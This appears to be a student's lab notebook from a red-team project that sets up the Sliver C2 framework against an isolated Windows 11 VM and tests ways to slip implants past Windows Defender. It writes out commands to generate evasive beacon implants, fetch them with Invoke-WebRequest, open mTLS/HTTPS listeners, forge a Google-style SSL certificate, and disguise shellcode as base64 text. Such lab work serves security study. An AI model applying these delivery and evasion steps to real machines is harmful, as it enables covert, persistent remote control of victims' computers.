## Our work assumes post-exploitation

### Notes for things I learned through the process:
- A C2 is only useful after an attacker has **already** compromised a target machine, and is able to traverse through the target to set up the implant for the C2 framework. This is because a C2 is only used to ensure future long-term access without needing to exploit the target each time.
- The implant must be running for the listener on the C2 server to connect to it.
- Windows Defender will detect implants and block them from running (this could be something to look at).
- Persistence: we need a way for the implant to keep running even after reboots or something else that causes it to stop.
- An implant that reconnects after reboots is essentially a backdoor. C2s relies on implants/backdoors but a backdoor does not necessarily involve a C2.
- Windows Defender is an AV, not a full EDR system.
- For Sliver, there are session implants and beacon implants. Session implants maintain a persistent connection, are ready to go, and are less stealthy. Beacon implants check in periodically, making them the stealthier option.
- Some terminiology:
- Listener: Used to listen for stager to call back at which point it will send the rest of the payload. https://www.thezentester.com/sliver-c2-staged-implants/
- Stage Listener: Used to deliever the stager
- use `jobs` in sliver to see existing listeners
- use `profiles` to see profiles
- Session implant: provides persistent access. Constantly in communication, essentially an active reverse shell.
- Beacon implant: checks in periodically for new commands, less noisy.
- Why build a custom payload? The simple answer is if its well known in the offensive space, then its most likely well known in the defensive space as well, including to EDR and AV vendors. Payloads created with default setups will usually be able to be picked up by security solutions almost instantly. An example of this is to create a default msfvenom payload yourself then try to place it on your Windows desktop (or a windows VM if you're using another OS) with Defender ON. https://redheadsec.tech/building-a-simple-custom-implant-for-sliver-shellcode/
- But normally staged payloads are preferable as it allows for a smaller footprint for AV to hit on when they are loaded on to the system.
- mtls better for encryption, https better for stealth
  
---

### Feb 14
I decided to use Windows 11 image for victim machine due to its wide usage in the world. Virtual machine so that it is in a controlled environment. I also changed the victim machine (w11vi) network settings to "Host-Only" by changing the Adapter to Host-Only Adapter. This is to keep the VM offline but open to C2 communication. I wanted to keep the VM offline because Caeland brought to my awareness that connecting the victim device to the internet opens it up to attacks from actual attackers and that may affect my host machine, which I didn't want. So by setting my victim's machine IP to 192.168.56.100 (192.168.56.x range since subnet mask is (255.255.255.0 (/24)) ) and its default gateway to 192.168.56.1 (my host IP), so that the host (C2 server) and victim can communicate.

---

### Setting up Sliver
1. Clone this repo: `git clone --recursive https://github.com/ChamberZ1/Sliver.git`
2. Build Sliver: `cd sliver && make`
   
---

### Feb 17
Testing out Sliver, I first ran the server: `sudo ./sliver-server`. I created an implant using `generate --mtls 192.168.56.1`, where:
- `--mtls` specifies to use Mutual TLS encryption for communication. From the Sliver documentation: "you must specify at least one C2 endpoint using `--mtls`, `--wg`, `--http`, or `--dns`." It is recommended to use `--mtls` or `--wg` where possible 
- Note: `192.168.56.1` is not my internet IP, but the IP of the VirtualBox Host-Only Adapter which acts as a gateway for the Linux (Host) machine and Windows (Victim) virtual machine to communicate.

The implant was saved to `/home/charlitos/sliver/`. I created an HTTP server using `python3 -m http.server 8080` to send the file to the Windows machine. I used `Invoke-WebRequest -Uri http://192.168.56.1:8080/implant_name.exe C:\Users\Public\any_name.exe` to receive the file on the Windows machine. However, Windows Defender was blocking it and so I temporarily disabled Windows Defender. Then, I ran the implant `any_name.exe` and went back to Sliver on the host device.

I set up a listener on Sliver using `mtls --lhost 192.168.56.1 --lport 443`. I used port 443 to try and blend in with normal internet traffic. 

I had to change some firewall permissions on my Linux device (specifically port 443 and 8080 from 192.168.56.100) to allow communication and file transfer between host and victim machine.

So it worked, I was able to execute commands on the victim machine, and open the shell to do more. I did receive a warning regarding "bad OPSEC" when I opened a shell. This basically means that what I did was easily detectable, so that's something I could look into.

Also, the implant works only as long as it is a running process. 

---

### Feb 28
My Objective now is to modify the implant in some way to get it onto the Windows machine without Defender noticing. If we can do that, we will then see if we can hit Defender with something to get it to let default implants to slip by.

So far, we are able to transfer the file onto Windows without Defender flagging it as long as it is zipped or using upx.

Modifying the implant: 
- I attempted to `echo "rndmdata123" >> implant.exe`, *insert reason and what this does*, this did not work.

### March 4
Updates:
I'm going through a bunch of websites and blogs to see how others are doing this. Plan is to use stagers
Installed Metasploit to get SSL cert and key to encrypt the communication between the stager and listener when it is retrieving the implant, so that AV doesn't detect it. 
I generate a certificate in PEM format using a module by Chris John Riley called impersonate_ssl that will generate one based on the information it gathers from the certificate of a website specified in the RHOST parameter of the module. This makes the cert look legitimate. In the example I follow, they use Google's SSL cert as the base for the fake cert. 
https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8
https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation
 
Notes:

$ generate beacon --mtls -e
Generate beacon implant, using --mtls, -e for including evasion techniques
GOT FLAGGED

Base64 Encoding:
$ base64 implant. exe > implant.b64
> certutil -decode implant.b64 implant.exe
GOT FLAGGED

Zip Files:
GOT FLAGGED

Encrypted Zip File:
DID NOT GET FLAGGED UPON EXTRACTION

FTP:
Chose not to proceed because it required modifying Firewall settings to allow File Transfer Program to run properly. (See FTP image.png in pictures).
"I would avoid modifying the Windows Firewall unless absolutely necessary. Any firewall rule changes could leave forensic traces, making detection more likely. Instead, I would use more covert methods to transfer and execute the implant."

---

Stagers and Process injection:
A stager is a small initial payload that retrieves a larger payload (a Sliver implant) from a remote C2 server. It acts as a first-stage loader that downloads and executes the actual malware. 

Process injection is a technique where malicious code is injected into a legitimate process (like explorer.exe or notepad.exe) so that the implant runs inside the trusted process instead of creating its own malicious-looking process.

Process injection itself won't bypass Windows Defender, but it makes detection harder. Whether Windows Defender catches the Sliver implant depends on how the stager and beacon are delivered and executed.

"Sliver implants provide some basic obfuscation but they are not designed for AV or EDR evasion." https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/

---

Executing in Memory:
This means running code without writing it to disk. Instead of saving a file like .exe to the system and then running (Disk-based execution), the code is loaded directly into memory (RAM) and executed from there. This is a common evasion technique.

Can be detected by Memory-based monitoring.

Often used with processing injection to evade detection.

### March 6
Continuing off from March 4 work:
Followed the darkoperator article for the most part. Hit some roadblocks due to different metasploit versions operating differently. For example, the example used `use exploit/multi/handler` and `set HANDLERSSLCERT <path to PEM file>`. However, my version did not have `HANDLERSSLCERT`. 

I did some research to learn about why this article is useful.
Reverse shells using HTTP or HTTPS can be detected easily when security tools inspect traffic. SSL is used to encrypt traffic between target machine and the attacker listener, making it harder for defense systems to inspect payloads. An SSL certificate ensures that only the intended endpoints have access to the traffic (attacker and victim). Impersonated certificates help cloak the traffic as legitimate traffic. However, security tools have improved over the years and this method is not as effective as it once was. 

Using mTLS authenticates both sides for better security. It sort of acts as an assurance for the attacker that it is communicating with the target and not some defense system.

---

### March 16
Creating a custom c2profile: `sliver > c2profiles generate -f /home/charlitos/sliver/uris.txt -n custom-c2profile -i`. This defines trasnport behavior and how the implant communicates. This is different from `profiles new ...`,  which creates a profile that is used when generating an implant, which dictates how the implant itself should behave.

Creating a custom (beacon) implant profile: `profiles new beacon stealthy-beacon --http https://192.168.50.1:443 --c2profile custom-c2profile --format shellcode --arch amd64 --evasion --seconds 60 --jitter 3`.

^^^ scratch all this. I had issues trying to make a custom c2profile and then creating an implant profile using the custom c2profile. It didn't work out.

Generates beacon implant (previously I had thought this generates a stager, it DOESNT) `generate beacon --name stealth-stager --format shellcode --arch amd64 --http https://192.168.50.1:443 --c2profile default --evasion --skip-symbols --poll-timeout 60 --reconnect 60` 

Key aspects of the generated beacon based on the command:

    It uses HTTP(S) for communication with the C2 server at 192.168.50.1:443

    It applies the "default" C2 profile for traffic shaping

    Evasion techniques are enabled

    Symbol obfuscation is skipped for faster compilation

    The poll timeout is set to 60 seconds

    It will attempt to reconnect every 60 seconds if the connection is lost


We use a loader as it is a way to execute the stager more stealthily. Supposedly once we get the stager shellcode onto the system and running, the stager will communicate with the c2 server and have it auto build and send the full implant over.

---

### March 23
Using above stealth-stager, Base64-encode the stager: `base64 stealth-stager.bin > shellcode.txt`. Use DropBox to transfer onto Windows Machine. Tried using .7z to encrypt the file for better stealth when getting it onto the Windows System (try to avoid scanning), but Windows by default does not come with any tools that can extract .7z files. So I tried transferring the base64-encoded stager `shellcode.txt` to the Windows machine using DropBox and Defender didn't flag it (this is because base64 encode makes it appear as a regular txt file).

so FUCK ME THIS WAS JUST A BEACON IMPLANT ALL ALONG. We're gonna see if we can get it to run without Defender detecting. 

